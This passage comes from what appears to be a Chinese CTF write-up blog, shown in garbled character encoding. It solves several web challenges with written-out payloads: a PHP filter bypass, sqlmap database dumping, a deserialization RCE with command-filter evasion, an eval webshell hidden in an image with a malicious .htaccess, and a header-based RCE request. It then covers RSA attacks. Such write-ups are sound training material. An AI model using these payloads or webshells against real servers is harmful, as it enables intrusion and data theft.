ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–ä¸€äº›è¿‡æ»¤å™¨å¯ä»¥ç”¨</li><li>æ„é€ <strong>payloadï¼š</strong><code>php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png" alt="image-20231017142837510"></p><ol start="4"><li>æˆåŠŸæ‹¿åˆ°flag<code>flag&#123;670e28dc-940b-4d66-92ec-40be4a0ae771&#125;</code></li></ol><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><ol><li><p>çœ‹åˆ°é¢˜ç›®ï¼Œè‚¯å®šæ˜¯sqlæ³¨å…¥ç›¸å…³çš„ï¼Œç›´æ¥sqlmapæ‰«æ</p><p><code>sqlmap -u &quot;http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503&quot; --dbs  </code></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png" alt="image-20231010093655169"></p><ol start="2"><li><p>ç›´æ¥ä½¿ç”¨ <code>--dump</code>,åˆ—å‡ºæ‰€æœ‰çš„è¡¨æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png" alt="image-20231010093800968"></p></li></ol><p>â€‹<code>flag&#123;ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d&#125;</code></p><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize?"></a>Unserialize?</h3><ol><li>æ‰“å¼€çœ‹åˆ°æºç </li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol start="2"><li><p>å‘ç°åªéœ€è¦è®¾ç½®evilç±»ä¸­cmdæˆå‘˜çš„å€¼ç„¶åååºåˆ—åŒ–è§¦å‘<code>__destruct</code>ææ„å‡½æ•°å³å¯è§¦å‘RCE</p></li><li><p>å‘ç°è¿‡æ»¤äº†<code>cat|tac|more|tail|base</code>ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>ls</code> æŸ¥çœ‹ç›®å½•ï¼Œæ„é€ payload</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line">  O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>ls%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png" alt="image-20231017143949315"></p><ol start="4"><li>å‘ç°å½“å‰ç›®å½•åªæœ‰<code>index.php</code>,äºæ˜¯æŸ¥çœ‹æ ¹ç›®å½•</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line">  O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>ls+%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ol start="5"><li><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿è¡Œç»“æœä¸­æœ‰ + éœ€è¦å°†+æ”¹æˆ%20ï¼Œå¾—åˆ°æ ¹ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png" alt="image-20231017144311370"></p></li><li><p>æ‰¾åˆ°å¯ç–‘ç›®å½•<code>th1s_1s_fffflllll4444aaaggggg</code>,ä½†æ˜¯catè¢«è¿‡æ»¤ï¼Œæƒ³åŠæ³•ç»•è¿‡</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ca``t th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line"> O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>evil%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A36%<span class="number">3</span>A%<span class="number">22</span>ca%<span class="number">60</span>%<span class="number">60</span>t+%<span class="number">2</span>Fth1s_1s_fffflllll4444aaaggggg%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png" alt="image-20231017144727107"></p><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png" alt="image-20231010094041762"></p><ol><li><p>é¦–å…ˆåˆ©ç”¨bpæŠ“åŒ…è¯•è¯•ï¼Œæ­£å¸¸ä¸Šä¼ å›¾ç‰‡æ­£å¸¸å›æ˜¾</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png" alt="image-20231010094343511"></p></li><li><p>å°†å›¾ç‰‡åç¼€æ›´æ”¹ä¸ºphpï¼Œæ˜¾ç¤ºé”™è¯¯</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png" alt="image-20231010094430575"></p></li><li><p>è¯•ç€ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè¿˜æ˜¯èƒ½æ£€æµ‹å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png" alt="image-20231010094608740"></p></li><li><p>çŒœæµ‹å¯èƒ½æ˜¯æ£€æµ‹äº†åç¼€ï¼Œä»¥åŠæ£€æµ‹å›¾ç‰‡å†…å®¹ä¸­æ˜¯å¦åŒ…å«äº†phpä»£ç ï¼Œè¯•ç€å»æ‰phpä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png" alt="image-20231010094944563"></p></li><li><p>ä»ç„¶è¢«æ£€æµ‹å‡ºæ¥ï¼Œç°åœ¨çŒœæµ‹å¯èƒ½æ˜¯ç”±äº<code>&lt;? ?&gt;</code>ï¼Œå»æ‰<code>&lt;? ?&gt;</code>,ä¿ç•™phpä¸­çš„ä»£ç ï¼Œå‘ç°èƒ½æˆåŠŸä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png" alt="image-20231010095437194"></p></li><li><p><strong>åˆ©ç”¨scriptä»£æ›¿<? ã€?>æ ‡ç­¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;111111&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>ä½†æ˜¯ï¼Œå›¾ç‰‡ä¸­çš„phpä»£ç ä¸èƒ½è¢«è§£æï¼Œå°è¯•å…ˆä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶ï¼Œåœ¨ä¸Šä¼ å¯¹åº”å›¾ç‰‡ï¼Œè¿™æ ·å›¾ç‰‡ä¸­çš„phpä»£ç å°±èƒ½è¢«è§£æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.png&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png" alt="image-20231010100336815"></p><ol start="8"><li><p>æ¥ç€ä¸Šä¼  <code>evil.png</code>æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png" alt="image-20231010100505136"></p></li><li><p>æ¥ç€ç”¨èšå‰‘è¿æ¥ï¼ŒæŸ¥è¯¢å¯ç–‘æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png" alt="image-20231010101448421"></p></li></ol><p><code>flag&#123;4366f19d-3ec5-4dec-801f-113d944e370a&#125;</code></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>æ ¹æ®æç¤ºæœ‰ä¿¡æ¯æ³„éœ²ï¼Œå¯ä»¥ä½¿ç”¨dirsearchæ‰«ï¼Œæ‰«å‡ºäº† &#x2F;.git</p><p>ä½¿ç”¨githackå·¥å…·è·å–æºç </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png" alt="image-20231025154033987"></p><p>bo0g1pop.phpæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºç»•è¿‡ä¸¤å¤„æ­£åˆ™ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚</li><li>ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚</li></ul><p>å®˜æ–¹payloadï¼ˆä½¿ç”¨ bp å‘é€çš„è¯·æ±‚ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /bo0g1pop.php?star=<span class="built_in">eval</span>(pos(array_reverse(getallheaders()))); HTTP/1.1</span><br><span class="line">Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflateConnection: close</span><br><span class="line">X-Forwarder-Proto: system(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ç¯‡writeupå†™çš„å¾ˆå¥½ï¼š<a href="https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html">https://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="æ»´å•¤"><a href="#æ»´å•¤" class="headerlink" title="æ»´å•¤"></a>æ»´å•¤</h3><ol><li><p>æ ¹æ®æç¤º åº”è¯¥è€ƒå¯Ÿçš„æ˜¯RSA <code>dpæ³„éœ²</code></p><p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png" alt="image-20231010151245060"></p></li><li><p>çœ‹åˆ°æ³¨é‡Šçš„ä¸‰æ¡æ•°æ®ï¼Œå¤§æ¦‚ç‡å°±æ˜¯dpæ³„éœ²ï¼Œç¼–å†™dpæ³„éœ²è„šæœ¬</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n= <span class="number">93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">c= <span class="number">52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089</span></span><br><span class="line">dp= <span class="number">307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635</span></span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(<span class="built_in">pow</span>(<span class="number">2</span>,e*dp,n)-<span class="number">2</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png" alt="image-20231010151350788"></p><p><code>flag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;</code></p><h3 id="ä¸æ­¢ä¸€ä¸ªpi"><a href="#ä¸æ­¢ä¸€ä¸ªpi" class="headerlink" title="ä¸æ­¢ä¸€ä¸ªpi"></a>ä¸æ­¢ä¸€ä¸ªpi</h3><ol><li>åŒæ ·æ ¹æ®é¢˜ç›®å’Œç»™å‡ºçš„pythonä»£ç ï¼ŒçŒœæµ‹ä»ç„¶æ˜¯RSAä¸­çš„ <code>eå’Œphiä¸äº’ç´ </code>ï¼Œå³æ˜¯ å­˜åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªæ¨¡æ•°<strong>ä¸”<code>gcd(N1,N2)!=1</code></strong></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png" alt="image-20231010152809765"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217</span></span><br><span class="line">q = <span class="number">115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t = gmpy2.gcd(e, phi)</span><br><span class="line">t1 = e // t</span><br><span class="line">dt1 = gmpy2.invert(t1, phi)</span><br><span class="line">mt1 = <span class="built_in">pow</span>(c, dt1, n)</span><br><span class="line"><span class="built_in">print</span>(mt1)</span><br><span class="line">s, m = gmpy2.iroot(mt1, t)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(s)))</span><br></pre></td></tr></table></figure><p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png" alt="image-20231010152850074"></p><p><code>flag&#123;bu_zhi_yige_p1dsaf&#125;</code></p><h3 id="halfcandecode"><a href="#halfcandecode" class="headerlink" title="halfcandecode"></a>halfcandecode</h3><p>out.txtï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969</span><br><span class="line">43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">03c7c0ace395d80182db07ae2c30f034</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7</span><br><span class="line">0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">cbb184dd8e05c9709e5dcaedaa0495cf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">number</span>):</span><br><span class="line">    p = getPrime(number // <span class="number">2</span>)</span><br><span class="line">    q = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">return</span> p * q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> md5(m.encode()).hexdigest()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = gen_prime(<span class="number">1024</span>)</span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>].encode() + os.urandom(<span class="number">8</span>))</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">m2 = flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(c1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> m2:</span><br><span class="line">        f.write(<span class="built_in">str</span>(md5_hash(t))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­æ˜¯RSA çš„åŠ å¯†ï¼Œæ 